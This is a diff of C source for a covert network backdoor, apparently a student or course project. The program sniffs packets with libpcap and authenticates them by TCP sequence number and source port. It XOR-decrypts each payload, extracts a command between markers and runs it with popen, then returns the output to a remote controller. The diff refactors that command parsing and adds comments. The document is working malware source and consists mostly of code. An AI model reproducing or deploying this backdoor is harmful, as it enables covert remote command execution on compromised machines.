@@ -57,42 +57,27 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
     tcp_sport = ntohs(tcp->th_sport);
     tcp_seqnum = ntohl(tcp->th_seq);
 
-    // Step 1: Locate the payload of the packet
+    // locate the payload of the packet
     payload = (char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
     size_payload = ntohs(ip->ip_len) - size_ip - size_tcp;
 
-    // Step 2: Authenticate the packet
+    // authenticate the packet
     if (!is_seq_num_auth(tcp_sport, tcp_seqnum))
     {
         return;
     }
 
-    if (mode == BACKDOOR)
-    {
-        printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n", tcp_sport, tcp_seqnum);
-    }
-
+    // grab addresses
     inet_ntop(AF_INET, &this_ip.s_addr, ip_str_local, INET_ADDRSTRLEN);
     inet_ntop(AF_INET, &ip->ip_src.s_addr, ip_str_recv, INET_ADDRSTRLEN);
-    if (mode == BACKDOOR)
-    {
-        printf("local addresss = %s, received address = %s\n", ip_str_local, ip_str_recv);
-    }
 
-    if (ip->ip_src.s_addr == this_ip.s_addr)
-    {
-        if (mode == BACKDOOR)
-        {
-            printf("ignoring packet from self\n");
-        }
-        return;
-    }
-
-    // Step 3: Decrypt the payload
+    // decrypt the payload
     xor_bytes(XOR_KEY, strlen(XOR_KEY), payload, decrypted, size_payload);
 
     if (mode == BACKDOOR)
     {
+        printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n", tcp_sport, tcp_seqnum);
+        printf("local addresss = %s, received address = %s\n", ip_str_local, ip_str_recv);
         backdoor_mode(decrypted, this_ip, ip->ip_src);
     }
     else if (mode == CONTROLLER)
@@ -107,6 +92,14 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
     return;
 }
 
+/*
+ * The main logic for the backdoor mode.
+ *
+ * Params:
+ *      const char *decrypted: The decrypted payload.
+ *      const struct in_addr this_ip: The ip of the machine that is running the backdoor.
+ *      const struct in_addr address: The address of the remote controller that send the packet.
+ */
 void backdoor_mode(const char *decrypted, const struct in_addr this_ip, const struct in_addr address)
 {
     FILE *fp;
@@ -116,21 +109,14 @@ void backdoor_mode(const char *decrypted, const struct in_addr this_ip, const st
     char encrypted[MAX_LINE_LEN];
     int num_read;
 
-    // Step 4: Verify decrypted payload has a command in it
-    if (!(command = strstr(decrypted, COMMAND_START)))
+    // verify decrypted payload has a command in it
+    if (!(command = get_command(decrypted)))
     {
-        printf("Could not find command start\n");
+        printf("Could not find command\n");
         return;
     }
-    command = command + strlen(COMMAND_START);
-    if (!(end_ptr = strstr(decrypted, COMMAND_END)))
-    {
-        printf("Could not find command end\n");
-        return;
-    }
-    *end_ptr = 0;
 
-    // Step 5: Execute the command
+    // execute the command
     fp = popen(command, "r");
 
     memset(line_buffer, 0, MAX_LINE_LEN);
@@ -148,7 +134,51 @@ void backdoor_mode(const char *decrypted, const struct in_addr this_ip, const st
     pclose(fp);
 }
 
+/*
+ * The main logic for the controller mode.
+ *
+ * Params:
+ *      const char *decrypted: The decrypted payload.
+ */
 void controller_mode(const char *decrypted)
 {
+    char *command;
+
+    // ignore packet if it contains a command
+    if ((command = get_command(decrypted)))
+    {
+        return;
+    }
+
+    // print out the response
     printf("%s", decrypted);
+}
+
+/*
+ * Extracts the command from the payload. This function will place a null byte at the end of the command.
+ *
+ * Params:
+ *      const char *payload: The decrypted payload to seach for a command.
+ *
+ * Returns:
+ *      A pointer to the start of the null terminated command string if a command is found, otherwise NULL.
+ */
+char *get_command(const char *payload)
+{
+    char *command;
+    char *end_ptr;
+
+    if (!(command = strstr(payload, COMMAND_START)))
+    {
+        printf("Could not find command start\n");
+        return NULL;
+    }
+    command = command + strlen(COMMAND_START);
+    if (!(end_ptr = strstr(payload, COMMAND_END)))
+    {
+        return NULL;
+    }
+    *end_ptr = 0;
+
+    return command;
 }
